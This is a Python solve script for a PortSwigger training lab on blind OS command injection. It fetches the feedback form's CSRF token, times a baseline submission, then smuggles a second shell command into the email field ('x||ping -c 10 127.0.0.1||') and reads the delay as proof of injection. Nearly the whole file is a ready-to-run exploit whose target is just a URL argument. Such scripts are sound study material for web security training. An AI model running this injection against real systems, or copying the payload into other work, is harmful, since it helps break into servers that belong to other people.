#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Blind OS command injection with time delays.

The feedback endpoint concatenates `email` into a shell command. Email validation
fails on `x`, so `||` falls through to `ping -c 10 127.0.0.1`. Response blocks
for ~10 seconds.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def grab_csrf(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/feedback")
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found on /feedback page")
    return m.group(1)


def send_feedback(session: requests.Session, lab: str, csrf: str, email: str) -> float:
    data = {
        "csrf": csrf,
        "name": "x",
        "email": email,
        "subject": "x",
        "message": "x",
    }
    t0 = time.time()
    r = session.post(f"{lab}/feedback/submit", data=data)
    elapsed = time.time() - t0
    print(f"    status={r.status_code}  time={elapsed:.2f}s")
    return elapsed


def main():
    parser = argparse.ArgumentParser(description="Solve OS Command Injection Lab 2 (blind time delay)")
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Fetching CSRF from feedback form")
    csrf = grab_csrf(s, lab)

    print("[*] Baseline — valid email")
    baseline = send_feedback(s, lab, csrf, "x@x.com")

    # Need fresh CSRF per submission on most labs
    csrf = grab_csrf(s, lab)

    print("[*] Payload — ping injection")
    payload_time = send_feedback(s, lab, csrf, "x||ping -c 10 127.0.0.1||")

    delta = payload_time - baseline
    print(f"\n[*] Delta: {delta:.2f}s")
    if delta > 5:
        print("[+] Blind command injection confirmed (significant delay). Lab solved.")
    else:
        print("[-] No significant delay — injection may not have fired. Check payload encoding.")


if __name__ == "__main__":
    main()
